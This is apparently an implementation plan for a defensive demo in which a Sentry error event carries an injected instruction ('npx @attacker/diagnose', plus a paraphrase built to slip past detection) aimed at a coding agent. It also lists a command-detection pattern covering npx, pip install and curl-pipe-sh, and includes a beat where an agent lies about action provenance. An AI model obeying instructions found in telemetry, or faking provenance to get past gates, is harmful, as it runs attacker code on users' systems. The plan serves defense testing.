Agentjacking Demo — Boundary-Only Implementation Plan
Architecture (per the coding-agent prompt + note.md)
Pre-v0 demo: EnterBelief → AddEvidence → RetireDebt → Promote → IntentOnPromoted with invariants promoted_is_debt_free, gate, live_requires_promoted. No v0 authority DDL/APIs.

Zero changes to the generic core. Verified against the code:

normalize.NormalizedEvidence is a plain exported struct — the Sentry adapter constructs it directly (provenance external_feed, Sentry data opaque in DomainPayload). No SourceSentryError, no normalizeSentryError.
belief.Process consumes any derive.DerivedBelief — the adapter supplies a fixed-shape non-actionable belief. No derive changes, no deriveFromSentry.
"sentry_error" is an adapter-level SourceType string with no DebtMapping entry, so the generic debt engine (unaware of Sentry) retires exactly zero debt — all six kernel.FullDebt items remain. This is structural, not a special case.
The defense is "payload text has no authority," NOT "detector saw npx." embedded_commands is informational only (§5/§6).
Note on debt vocabulary: the prompt lists needMap/needInvariant/needToyCheck/needNullModel/needObstruction/needFaithfulnessReview; those do not exist in code. The actual six are kernel.FullDebt = needProvenanceCheck, needContradictionSweep, needBlastRadius, needRollbackPlan, needVersionPin, needOperatorSignoff (pinned by db/001_schema.sql). Tests assert against kernel.FullDebt, never a hardcoded list.

Files
1. Fixtures — demo/agentjacking/fixtures/
sentry_error.json — plausible event (project: "etcd-production"), message with realistic error text + ## Resolution + npx @attacker/diagnose. Harmless; never executed.
sentry_error_nodetect.json — attacker instruction the detector misses (e.g. "launch the diagnostic helper from the package registry"), for test D / §6 proof.
These live at the boundary (not in internal/derive/testdata/, not in pipeline.sourceTypeMap). The fixture file IS the preserved verbatim raw payload; the ledger's evidence row carries its SHA-256, which is the trace from row to artifact (kernel evidence rows store only provenance/source_url/sha256 — verified in kernel/sql.go).
2. Adapter — internal/agentjacking/ (new package; one of the prompt's sanctioned locations)
Event struct + Parse(raw []byte) — requires project and message.
DetectCommands(message string) []string — informational scan (npx, npm exec, pip install, curl … | sh, wget). Documented as audit metadata, explicitly not load-bearing.
BuildEvidence(ev) normalize.NormalizedEvidence — ProvenanceClass: "external_feed", SourceType: "sentry_error" (adapter string), SourceURL: "sentry://<project>/<event_id>" (synthetic label; no network call), Subject: project, Assertion: message_clean, ContentSHA256 = SHA-256 of raw event bytes, DomainPayload = JSON {"message_raw": <verbatim>, "message_clean": <markdown-stripped>, "embedded_commands": [...]}. Raw text preserved byte-identical; nothing sanitized.
Belief(evidence) derive.DerivedBelief — fixed-shape claim: error report for <subject> recorded from external telemetry; embedded command text is evidence, not instruction. Classification derive.Derived (never Accommodated); claim never contains command text.
Ingest(ctx, db, scenarioID, fixturePath) (Result, error) — kernel.EnsureBelief (returns the ID belief.Process doesn't) → belief.Process → Result{BeliefID, Claim, ProvenanceClass, DetectedCommands, DebtRemaining} (debt read via internal/view.GetSnapshot, read-only).
Uses stripMarkdown — one tiny generic change: export StripMarkdown from internal/normalize as a 3-line wrapper (burden of proof documented: normalize has no exported markdown API, and duplicating the helper would violate the no-duplicated-truth rule).
3. Adapter command — demo/agentjacking/ingest/main.go
Thin CLI (mirrors demo/cloud/init pattern): --dsn --scenario --fixture [--reset], prints the Result JSON (belief_id, claim, provenance, remaining debt, detected commands, message_raw echoed verbatim). --reset clears only the demo scenario's rows (scoped DELETEs, demo-boundary concern — never in the kernel/MCP).

4. Track3 centralization — cmd/solvent-mcp/scenarios.go (new file)
One shared definition: ordered {Name, ID} list (track1→…0001, track2→…0002, track3→…0003) with scenarioNames() and lookupScenario(name) helpers. main.go uses it for: the scenarioToID lookup, all 7 tool-schema scenario enums ("enum": scenarioNames()), the fixture-root validation loop, and tools.go error messages. Existing track1/track2 IDs and enum order preserved; track3 appended.

5. Layer 4 — cmd/solvent-mcp
main.go solvent_authorize_action schema: add required action_source (enum: ["user_typed","tool_output"]) described as a caller-declared provenance signal, explicitly not cryptographically trustworthy.
tools.go handleSolventAuthorizeAction: validate action_source first, before any DB read:
missing / invalid value / tool_output → immediate refusal via plain errorResult — no DB query, no AuditIntent, no audit envelope, no transaction. Refusal text names the principle: action strings may not originate in tool output — retrieval is not authority.
user_typed → unchanged existing path (cross-scenario view guard → IntentOnPromoted → audit envelope). No belief-status prechecks added; DB policy stays in the DB.
6. scripts/mcp_verify.sh extensions
solvent_authorize_action advertises action_source, required, enum exactly [user_typed, tool_output].
Scenario enums include track3.
tool_output refusal returns an error result without an audit envelope (the DB-free path's fingerprint), and its text contains the retrieval-is-not-authority wording; contrasted with user_typed + unknown belief → error with audit envelope (DB path taken). Tool count stays exactly 7 — existing assertion untouched.
7. scripts/demo/config.env
Add SOLVENT_SCENARIO_3=00000000-0000-0000-0000-000000000003.

8. scripts/demo/agentjacking.sh — the seven beats, exactly as specified
Sources config.env; uses track3; drives bin/solvent-mcp via raw JSON-RPC (mcp_verify.sh style); set -euo pipefail; pauses between beats; never executes the attacker command, never installs, never performs external calls. Adapter ingest is run with go run ./demo/agentjacking/ingest.

The attack — print sentry_error.json.
Ingest — run the adapter: external_feed provenance, non-actionable claim, six open debts, verbatim message_raw, informational embedded_commands.
Naive agent — solvent_authorize_action with action_source: "tool_output" → Layer 4 refusal, no audit envelope (no DB access), narration: retrieval is not authority.
Lying agent — repeat with action_source: "user_typed" → 23503 · gate (audit envelope present). Narration verbatim from §11: Layer 4 catches honest misuse; an adversarial agent can lie about the field; the database gate is the real boundary. The npx action string is NOT rejected on content — provenance alone.
Promotion attempt — show the six debts, then solvent_promote → 23514 · promoted_is_debt_free.
Legitimate authority — cmd/operator-review: enter a postulated claim (evidence-url = fixture path, evidence-sha = fixture SHA), retire all six debts, promote; then MCP solvent_authorize_action user_typed → live intent; show live_on_nonpromoted = 0.
Final ledger — read-only query of scenario 3: injected evidence → unpromoted → action refused; reviewed authority → promoted → live intent succeeds.
9. Taskfile.yml
demo:agentjacking task → bash scripts/demo/agentjacking.sh (deps: [db:up], matching existing conventions).

10. demo/agentjacking/README.md
Proves: attacker-controlled telemetry cannot become an authorized action through the current belief-promotion/action gate.
Does NOT prove: pre-v0 boundary — includes note.md's one-sentence framing ("exercises the pre-v0 belief-promotion/action gate (23514/23503); the v0 authority lifecycle strengthens this by binding authorization to an exact approved target/action tuple, closing the separate confused-deputy case").
Layer 4 honesty: action_source is caller-declared hygiene, catches honest misuse, cannot prove human provenance; the DB gate is the actual boundary (Beat 4 exists precisely to show this).
Detector honesty: embedded_commands is informational; the defense holds even when the detector misses (test D proves it).
Architecture: Sentry adapter → generic external-feed evidence → existing belief/debt machinery → existing DB gate; explicitly states no Sentry-specific semantics were added to kernel, derive, debt model, or schema.
Nothing executes: never runs the attacker command, never installs a package, never contacts attacker infrastructure.
Tests (prove the architecture, per §14)
internal/agentjacking/adapter_test.go (pure, no DB):
A: external_feed; message_raw byte-identical to fixture message; message_clean stripped; embedded_commands = ["npx"].
B: fixed-shape claim; classification Derived (never Accommodated); claim contains no command text.
D (detector miss): nodetect fixture → embedded_commands empty, claim still non-actionable, evidence intact.
internal/agentjacking/ingest_test.go (testdb harness, same pattern as internal/belief/belief_test.go):
C: after ingest, belief debt equals kernel.FullDebt exactly (all six, none retired).
G: Promote → ErrPromotionBlocked / SQLSTATE 23514.
F: IntentOnPromoted → ErrActionOnUnpromoted / SQLSTATE 23503.
cmd/solvent-mcp/tools_authority_test.go (extend existing):
E: missing / tool_output / invalid action_source → refusal with nil *sql.DB (any DB touch would panic — the no-DB proof), correct refusal text; plus a DB-backed case: user_typed on an unpromoted testdb belief → 23503 · gate.
Verification
task test → task mcp:verify → task demo:agentjacking against local CockroachDB. No hardcoded test counts anywhere.

Explicitly out of scope
No kernel/schema/table changes; no v0 authority lifecycle; no SourceSentryError/deriveFromSentry/DebtMapping["sentry_error"]/pipeline.sourceTypeMap entry; no MCP belief-status prechecks; no real Sentry API, npm, or network calls.